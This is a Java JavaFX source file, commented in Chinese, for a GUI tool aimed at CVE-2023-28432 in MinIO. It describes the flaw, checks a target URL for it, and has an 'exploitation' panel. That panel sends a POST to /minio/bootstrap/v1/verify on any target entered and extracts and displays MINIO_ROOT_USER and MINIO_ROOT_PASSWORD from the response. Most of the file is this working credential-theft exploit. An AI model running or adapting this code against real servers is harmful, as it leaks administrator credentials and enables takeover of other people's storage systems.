package com.example.demo1;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javafx.application.Application;
//Application 类是 JavaFX 应用程序的入口点，您的应用程序需要继承它并实现 start 方法。
import javafx.geometry.Insets;
//Insets 类表示一个用于控制边距（内边距或外边距）的对象，用于在 GUI 布局中调整组件的间距。
import javafx.scene.Scene;
//Scene 类表示 JavaFX 场景，是应用程序窗口中的内容的容器。它可以包含布局和控件。
import javafx.scene.control.*;
//javafx.scene.control 包包含了许多 JavaFX 的 UI 控件，如按钮、标签、文本框、文本区域等。
import javafx.scene.layout.HBox;
//HBox 类是 JavaFX 中的一个布局容器，用于在水平方向上排列子节点。
import javafx.scene.layout.VBox;
//VBox 类是 JavaFX 中的一个布局容器，用于在垂直方向上排列子节点。
import javafx.stage.Stage;
//Stage 类表示 JavaFX 应用程序的顶层窗口或舞台，它是 JavaFX 应用程序的主要容器。
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

// LouDongTool 类继承自 Application，用于创建 JavaFX 应用程序
public class LouDongTool extends Application{
    //使用 primaryStage，您可以控制主窗口的属性、内容和显示方式
    private Stage primaryStage;
    // 用于输入网址的文本框
    private TextField urlTextField;
    // JavaFX 应用程序的入口方法
    public static void main(String[] args) {
        launch(args);
    }
    @Override
    public void start(Stage primaryStage){
        this.primaryStage = primaryStage;
        primaryStage.setTitle("CVE-2023-28432 检测工具"); // 设置窗口标题
        createMainScene(); // 创建主界面
        primaryStage.show(); // 显示主窗口
    }
    // 创建主界面的方法
    private void createMainScene() {
        VBox vbox = new VBox(10); // 垂直布局，间距为 10
        vbox.setPadding(new Insets(10)); // 设置内边距
        // 创建顶部的功能按钮
        HBox buttonBox = new HBox(10); // 水平布局，间距为 10
        Button vulnerabilityDescriptionButton = new Button("漏洞描述"); // 新增按钮：漏洞描述
        Button vulnerabilityButton = new Button("漏洞检测");
        Button exploitationButton = new Button("漏洞利用");
        // 将按钮添加到布局中
        buttonBox.getChildren().addAll(vulnerabilityDescriptionButton, vulnerabilityButton, exploitationButton);
        // 创建漏洞描述界面
        VBox vulnerabilityDescriptionBox = createVulnerabilityDescriptionBox();
        // 创建漏洞检测界面
        VBox vulnerabilityBox = createVulnerabilityBox();
        // 创建漏洞利用界面
        VBox exploitationBox = createExploitationBox();
        // 设置按钮点击事件
        vulnerabilityDescriptionButton.setOnAction(event -> switchToScene(vulnerabilityDescriptionBox));
        vulnerabilityButton.setOnAction(event -> switchToScene(vulnerabilityBox));
        exploitationButton.setOnAction(event -> switchToScene(exploitationBox));
        vbox.getChildren().addAll(buttonBox, vulnerabilityDescriptionBox); // 默认显示漏洞描述界面
        Scene mainScene = new Scene(vbox, 600, 500); //
        // 创建场景，设置宽度和高度
        primaryStage.setScene(mainScene);
        // 设置主窗口的场景
    }
    // 创建漏洞描述界面的方法
    private VBox createVulnerabilityDescriptionBox(){
        VBox box = new VBox(10);//垂直布局，间距为 10
        box.setPadding(new Insets(10));// 设置内边距
        String description = "CVE-2023-28432是一个在MinIO中发现的敏感信息泄露漏洞。\n\n该漏洞主要影响使用MinIO的集群模式，可能会使未经身份认证的远程攻击者通过发送特殊HTTP请求获取包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD在内的环境变量信息。这些信息通常被用于访问MinIO接口，进行非法操作。因此，该漏洞可能导致攻击者以管理员身份登录MinIO，对系统造成潜在威胁，访问http://your-ip:9001可以查看Web管理页面，访问http://your-ip:9000是API服务。\n\n" +
                "建议受影响的用户尽快采取措施修复此漏洞，以避免遭受黑客攻击。\n"; // 漏洞描述内容
        // 多行文本框，用于显示漏洞描述
        TextArea descriptionTextArea = new TextArea(description);
        descriptionTextArea.setWrapText(true); // 设置文本自动换行
        box.getChildren().addAll(new Label("漏洞描述:"), descriptionTextArea); // 添加标签和文本框到布局中
        return box; // 返回漏洞描述界面的布局
    }
    // 创建漏洞检测界面的方法
    private VBox createVulnerabilityBox() {
        VBox box = new VBox(10);
        box.setPadding(new Insets(10));
        Label urlLabel = new Label("目标网站:"); // 标签，用于显示文本
        urlTextField = new TextField(); // 输入网址的文本框
        Button scanButton = new Button("检测漏洞"); // 检测漏洞的按钮
        Label promptLabel = new Label("检测结果如下:"); // 标签，用于显示文本
        TextArea resultTextArea = new TextArea(); // 多行文本框，用于显示检测结果
        // 检测漏洞按钮的点击事件
        //为 "检测漏洞" 按钮设置点击事件，当用户点击按钮时，会调用 checkVulnerability 方法执行漏洞检测操作，
        // 传入用户输入的 URL 和结果文本框。
        scanButton.setOnAction(event -> checkVulnerability(urlTextField.getText(), resultTextArea));

        // 将标签、文本框、按钮、多行文本框添加到布局中
        box.getChildren().addAll(urlLabel, urlTextField, scanButton, promptLabel, resultTextArea);
        return box; // 返回漏洞检测界面的布局
    }
    private VBox createExploitationBox() {
        VBox box = new VBox(10);
        box.setPadding(new Insets(10));

        Label targetUrlLabel = new Label("目标网站:");
        TextField targetUrlTextField = new TextField(); // 输入框，用于用户输入目标网站
        Button executeButton = new Button("漏洞利用");
        TextArea executionResultTextArea = new TextArea();
        Label executionPromptLabel = new Label("命令执行结果:");

        executeButton.setOnAction(event -> {
            String targetUrl = targetUrlTextField.getText(); // 获取用户输入的目标网站
            exploitVulnerability(targetUrl, executionResultTextArea);
        });

        box.getChildren().addAll(targetUrlLabel, targetUrlTextField, executeButton, executionPromptLabel, executionResultTextArea);
        return box;
    }


    //用于在主界面中切换显示不同的界面
    private void switchToScene(VBox box) {
        //获取主界面的根节点，这里假设根节点是一个垂直布局 (VBox)。
        VBox parentBox = (VBox) primaryStage.getScene().getRoot();
        parentBox.getChildren().remove(1);
        // 移除原有内容，移除根节点的第二个子节点，即移除原有内容。在这个代码片段中，根节点的第一个子节点是顶部的功能按钮，第二个子节点是当前显示的界面。
        parentBox.getChildren().add(box); // 添加新的界面
    }
    //检测漏洞方法
    public void checkVulnerability(String url, TextArea resultTextArea) {
        try {
            String payload = "/minio/bootstrap/v1/verify";
            URL target = new URL(url + payload);
            HttpURLConnection connection = (HttpURLConnection) target.openConnection();
            connection.setInstanceFollowRedirects(false); // 设置连接不自动重定向
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setReadTimeout(3000); // 设置超时时间

            int responseCode = connection.getResponseCode();
            String responseBody = new String(connection.getInputStream().readAllBytes());
            connection.disconnect();

            if (responseCode == 200 && responseBody.contains("MINIO_ROOT_USER")) {

                resultTextArea.appendText(url + "  [+]漏洞存在！！！\n");
            } else {
                resultTextArea.appendText(url + "  [-]漏洞不存在。\n");
            }
        } catch (IOException e) {
            resultTextArea.appendText("请求出错：" + e.getMessage() + "\n");
        }
    }
    // 漏洞利用方法
    public void exploitVulnerability(String url, TextArea executionResultTextArea) {
        try {
            String payload = "/minio/bootstrap/v1/verify";
            URL target = new URL(url + payload);
            HttpURLConnection connection = (HttpURLConnection) target.openConnection();
            connection.setInstanceFollowRedirects(false); // 设置连接不自动重定向
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setReadTimeout(3000); // 设置超时时间

            int responseCode = connection.getResponseCode();
            String responseBody = new String(connection.getInputStream().readAllBytes());
            connection.disconnect();

            if (responseCode == 200 && responseBody != null) {
                Pattern userPattern = Pattern.compile("\"MINIO_ROOT_USER\":\"(.*?)\"");
                Matcher userMatcher = userPattern.matcher(responseBody);
                String minioRootUser = userMatcher.find() ? userMatcher.group(1) : "未找到";

                Pattern passwordPattern = Pattern.compile("\"MINIO_ROOT_PASSWORD\":\"(.*?)\"");
                Matcher passwordMatcher = passwordPattern.matcher(responseBody);
                String minioRootPassword = passwordMatcher.find() ? passwordMatcher.group(1) : "未找到";

                executionResultTextArea.appendText("MINIO_ROOT_USER: " + minioRootUser + "\n");
                executionResultTextArea.appendText("MINIO_ROOT_PASSWORD: " + minioRootPassword + "\n");
            } else {
                executionResultTextArea.appendText("无法执行漏洞利用，漏洞可能不存在\n");
            }
        } catch (IOException e) {
            executionResultTextArea.appendText("请求出错：" + e.getMessage() + "\n");
        }
    }




}